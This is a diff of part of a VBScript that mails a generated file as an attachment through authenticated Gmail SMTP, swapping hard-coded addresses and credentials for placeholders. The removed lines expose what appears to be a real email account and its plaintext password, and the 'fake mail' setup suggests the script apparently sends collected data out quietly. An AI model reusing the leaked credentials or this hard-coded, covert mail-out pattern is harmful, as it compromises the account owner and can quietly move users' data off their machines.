@@ -389,11 +389,11 @@ objFile.Close
 
 Set emailObj      = CreateObject("CDO.Message")
 
-emailObj.From     = "baruchiroComputers@gmail.com"
-emailObj.To       = "baruchiro@gmail.com"
+emailObj.From     = "YourFakeMail@mail.com"
+emailObj.To       = "YourMainMailAdrresss@mail.com"
 
 emailObj.Subject  = InputBox("Please enter your name for send file:", "Send File")
-emailObj.TextBody = "Test CDO"
+emailObj.TextBody = "report"
 emailObj.AddAttachment outFile
 
 Set emailConfig = emailObj.Configuration
@@ -403,8 +403,8 @@ emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpserverpor
 emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendusing")    = 2  
 emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1  
 emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpusessl")      = true 
-emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendusername")    = "baruchiroComputers@gmail"
-emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendpassword")    = "0528109242"
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendusername")    = "YourFakeMail@mail"
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendpassword")    = "Password of your FakeMail"
 
 emailConfig.Fields.Update
 
